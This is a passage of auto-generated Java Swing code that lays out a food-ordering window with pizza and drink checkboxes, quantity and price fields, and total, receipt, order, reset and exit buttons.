jlableSub1 = new javax.swing.JLabel();\n        jlableSub2 = new javax.swing.JLabel();\n        jtxtfieldTax = new javax.swing.JTextField();\n        jtxtfieldTotal = new javax.swing.JTextField();\n        jtxtfieldStatus = new javax.swing.JTextField();\n        jScrollPane2 = new javax.swing.JScrollPane();\n        jtxtfieldReceipt = new javax.swing.JTextArea();\n        jTextField1 = new javax.swing.JTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTextArea1 = new javax.swing.JTextArea();\n\n        javax.swing.GroupLayout jFrame1Layout = new javax.swing.GroupLayout(jFrame1.getContentPane());\n        jFrame1.getContentPane().setLayout(jFrame1Layout);\n        jFrame1Layout.setHorizontalGroup(\n            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 400, Short.MAX_VALUE)\n        );\n        jFrame1Layout.setVerticalGroup(\n            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 300, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);\n        jPanel5.setLayout(jPanel5Layout);\n        jPanel5Layout.setHorizontalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel5Layout.setVerticalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel6Layout = new javax.swing.GroupLayout(jPanel6);\n        jPanel6.setLayout(jPanel6Layout);\n        jPanel6Layout.setHorizontalGroup(\n            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel6Layout.setVerticalGroup(\n            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setTitle(\"Order Your Food\");\n\n        jPanel1.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));\n\n        jchkboxSpizza.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxSpizza.setText(\"Small Pizaa\");\n        jchkboxSpizza.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jchkboxSpizzaActionPerformed(evt);\n            }\n        });\n\n        jchkboxMpizza.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxMpizza.setText(\"Medium Pizza\");\n        jchkboxMpizza.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jchkboxMpizzaActionPerformed(evt);\n            }\n        });\n\n        jchkboxLpizza.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxLpizza.setText(\"Large Pizza\");\n        jchkboxLpizza.setToolTipText(\"\");\n\n        jtxtfieldMeal.setEditable(false);\n        jtxtfieldMeal.setBackground(new java.awt.Color(255, 255, 102));\n        jtxtfieldMeal.setFont(new java.awt.Font(\"Tahoma\", 1, 28)); // NOI18N\n        jtxtfieldMeal.setHorizontalAlignment(javax.swing.JTextField.CENTER);\n        jtxtfieldMeal.setText(\"Meal Section\");\n        jtxtfieldMeal.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldMealActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldSmall.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldSmall.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldSmall.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldSmallFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldSmallFocusLost(evt);\n            }\n        });\n        jtxtfieldSmall.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldSmallActionPerformed(evt);\n            }\n        });\n        jtxtfieldSmall.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldSmallKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldMedium.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldMedium.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldMedium.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldMediumFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldMediumFocusLost(evt);\n            }\n        });\n        jtxtfieldMedium.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldMediumActionPerformed(evt);\n            }\n        });\n        jtxtfieldMedium.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldMediumKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldLarge.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldLarge.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldLarge.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldLargeFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldLargeFocusLost(evt);\n            }\n        });\n        jtxtfieldLarge.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldLargeKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldSmallP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldSmallP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldSmallP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldSmallPActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldMediumP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldMediumP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldMediumP.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldMediumPFocusLost(evt);\n            }\n        });\n        jtxtfieldMediumP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldMediumPActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldLargeP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldLargeP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldLargeP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldLargePActionPerformed(evt);\n            }\n        });\n\n        jLabel1.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel1.setText(\"Quantity\");\n\n        jLabel2.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jLabel2.setText(\"Price\");\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()\n                        .addGap(18, 18, 18)\n                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addGroup(jPanel1Layout.createSequentialGroup()\n                                .addComponent(jchkboxLpizza, javax.swing.GroupLayout.PREFERRED_SIZE, 166, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                                .addComponent(jtxtfieldLarge, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                                .addComponent(jtxtfieldLargeP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))\n                            .addGroup(jPanel1Layout.createSequentialGroup()\n                                .addGap(0, 0, Short.MAX_VALUE)\n                                .addComponent(jchkboxMpizza, javax.swing.GroupLayout.PREFERRED_SIZE, 166, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addGap(8, 8, 8)\n                                .addComponent(jtxtfieldMedium, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                                .addComponent(jtxtfieldMediumP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))))\n                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()\n                        .addGap(19, 19, 19)\n                        .addComponent(jchkboxSpizza, javax.swing.GroupLayout.PREFERRED_SIZE, 166, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                        .addComponent(jtxtfieldSmall, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                        .addComponent(jtxtfieldSmallP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()\n                        .addGap(59, 59, 59)\n                        .addComponent(jtxtfieldMeal, javax.swing.GroupLayout.PREFERRED_SIZE, 322, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addGap(0, 0, Short.MAX_VALUE)))\n                .addContainerGap())\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addComponent(jLabel1)\n                .addGap(56, 56, 56)\n                .addComponent(jLabel2)\n                .addGap(45, 45, 45))\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addContainerGap()\n                .addComponent(jtxtfieldMeal, javax.swing.GroupLayout.PREFERRED_SIZE, 57, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(51, 51, 51)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel1)\n                    .addComponent(jLabel2))\n                .addGap(18, 18, 18)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jchkboxSpizza)\n                    .addComponent(jtxtfieldSmall, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldSmallP, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(63, 63, 63)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jchkboxMpizza)\n                    .addComponent(jtxtfieldMedium, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldMediumP, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(70, 70, 70)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jchkboxLpizza)\n                    .addComponent(jtxtfieldLarge, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldLargeP, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addContainerGap(86, Short.MAX_VALUE))\n        );\n\n        jPanel2.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));\n\n        jtxtfieldDrink.setEditable(false);\n        jtxtfieldDrink.setBackground(new java.awt.Color(255, 255, 102));\n        jtxtfieldDrink.setFont(new java.awt.Font(\"Tahoma\", 1, 28)); // NOI18N\n        jtxtfieldDrink.setHorizontalAlignment(javax.swing.JTextField.CENTER);\n        jtxtfieldDrink.setText(\"Drink Section\");\n        jtxtfieldDrink.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldDrinkActionPerformed(evt);\n            }\n        });\n\n        jchkboxCoca.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxCoca.setText(\"Coca Cola\");\n        jchkboxCoca.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jchkboxCocaActionPerformed(evt);\n            }\n        });\n\n        jchkboxThums.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxThums.setText(\"Thums Up\");\n        jchkboxThums.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jchkboxThumsActionPerformed(evt);\n            }\n        });\n\n        jchkboxSprite.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jchkboxSprite.setText(\"Sprite\");\n        jchkboxSprite.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jchkboxSpriteActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldCoca.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldCoca.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldCoca.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldCocaFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldCocaFocusLost(evt);\n            }\n        });\n        jtxtfieldCoca.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldCocaActionPerformed(evt);\n            }\n        });\n        jtxtfieldCoca.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldCocaKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldSprite.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldSprite.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldSprite.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldSpriteFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldSpriteFocusLost(evt);\n            }\n        });\n        jtxtfieldSprite.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldSpriteActionPerformed(evt);\n            }\n        });\n        jtxtfieldSprite.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldSpriteKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldThums.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldThums.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldThums.addFocusListener(new java.awt.event.FocusAdapter() {\n            public void focusGained(java.awt.event.FocusEvent evt) {\n                jtxtfieldThumsFocusGained(evt);\n            }\n            public void focusLost(java.awt.event.FocusEvent evt) {\n                jtxtfieldThumsFocusLost(evt);\n            }\n        });\n        jtxtfieldThums.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldThumsActionPerformed(evt);\n            }\n        });\n        jtxtfieldThums.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                jtxtfieldThumsKeyPressed(evt);\n            }\n        });\n\n        jtxtfieldCocaP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldCocaP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldCocaP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldCocaPActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldThumsP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldThumsP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldThumsP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldThumsPActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldSpriteP.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldSpriteP.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldSpriteP.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldSpritePActionPerformed(evt);\n            }\n        });\n\n        jLabel3.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jLabel3.setText(\"Quantity\");\n\n        jLabel4.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jLabel4.setText(\"Price\");\n\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addGap(25, 25, 25)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                    .addGroup(jPanel2Layout.createSequentialGroup()\n                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addGroup(jPanel2Layout.createSequentialGroup()\n                                .addComponent(jchkboxThums, javax.swing.GroupLayout.PREFERRED_SIZE, 152, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addGap(0, 0, Short.MAX_VALUE))\n                            .addComponent(jchkboxSprite, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addGroup(jPanel2Layout.createSequentialGroup()\n                                .addComponent(jtxtfieldSprite, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                                .addComponent(jtxtfieldSpriteP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))\n                            .addGroup(jPanel2Layout.createSequentialGroup()\n                                .addComponent(jtxtfieldThums, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                                .addComponent(jtxtfieldThumsP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))))\n                    .addGroup(jPanel2Layout.createSequentialGroup()\n                        .addComponent(jchkboxCoca)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                        .addComponent(jtxtfieldCoca, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addComponent(jtxtfieldCocaP, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE)))\n                .addGap(68, 68, 68))\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addComponent(jLabel3)\n                .addGap(61, 61, 61)\n                .addComponent(jLabel4)\n                .addGap(101, 101, 101))\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addGap(65, 65, 65)\n                .addComponent(jtxtfieldDrink, javax.swing.GroupLayout.PREFERRED_SIZE, 334, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n        jPanel2Layout.setVerticalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addContainerGap()\n                .addComponent(jtxtfieldDrink, javax.swing.GroupLayout.PREFERRED_SIZE, 58, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(54, 54, 54)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel3)\n                    .addComponent(jLabel4))\n                .addGap(18, 18, 18)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jchkboxCoca)\n                    .addComponent(jtxtfieldCoca, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldCocaP, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(62, 62, 62)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jchkboxThums)\n                    .addComponent(jtxtfieldThums, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldThumsP, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(66, 66, 66)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jtxtfieldSprite, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldSpriteP, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jchkboxSprite))\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n\n        jbtnTotal.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jbtnTotal.setText(\"Total\");\n        jbtnTotal.addMouseListener(new java.awt.event.MouseAdapter() {\n            public void mouseClicked(java.awt.event.MouseEvent evt) {\n                jbtnTotalMouseClicked(evt);\n            }\n        });\n        jbtnTotal.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbtnTotalActionPerformed(evt);\n            }\n        });\n\n        jbtnOrder.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jbtnOrder.setText(\"Order\");\n        jbtnOrder.addMouseListener(new java.awt.event.MouseAdapter() {\n            public void mouseClicked(java.awt.event.MouseEvent evt) {\n                jbtnOrderMouseClicked(evt);\n            }\n        });\n        jbtnOrder.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbtnOrderActionPerformed(evt);\n            }\n        });\n\n        jbtnReceipt.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jbtnReceipt.setText(\"Receipt\");\n        jbtnReceipt.addMouseListener(new java.awt.event.MouseAdapter() {\n            public void mouseClicked(java.awt.event.MouseEvent evt) {\n                jbtnReceiptMouseClicked(evt);\n            }\n        });\n\n        jbtnReset.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jbtnReset.setText(\"Reset\");\n        jbtnReset.addMouseListener(new java.awt.event.MouseAdapter() {\n            public void mouseClicked(java.awt.event.MouseEvent evt) {\n                jbtnResetMouseClicked(evt);\n            }\n        });\n        jbtnReset.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbtnResetActionPerformed(evt);\n            }\n        });\n\n        jbtnExit.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jbtnExit.setText(\"Exit\");\n        jbtnExit.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbtnExitActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);\n        jPanel3.setLayout(jPanel3Layout);\n        jPanel3Layout.setHorizontalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel3Layout.createSequentialGroup()\n                .addGap(24, 24, 24)\n                .addComponent(jbtnTotal, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(72, 72, 72)\n                .addComponent(jbtnReceipt, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 80, Short.MAX_VALUE)\n                .addComponent(jbtnOrder, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(68, 68, 68)\n                .addComponent(jbtnReset, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(76, 76, 76)\n                .addComponent(jbtnExit, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(31, 31, 31))\n        );\n        jPanel3Layout.setVerticalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel3Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jbtnReceipt, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jbtnReset, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jbtnExit, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jbtnTotal, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jbtnOrder, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n\n        jPanel4.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));\n\n        jtxtfieldSub.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldSub.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldSub.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldSubActionPerformed(evt);\n            }\n        });\n\n        jlableSub.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jlableSub.setText(\"Sub Total :\");\n\n        jlableSub1.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jlableSub1.setText(\"TAX :\");\n\n        jlableSub2.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jlableSub2.setText(\"Total :\");\n\n        jtxtfieldTax.setFont(new 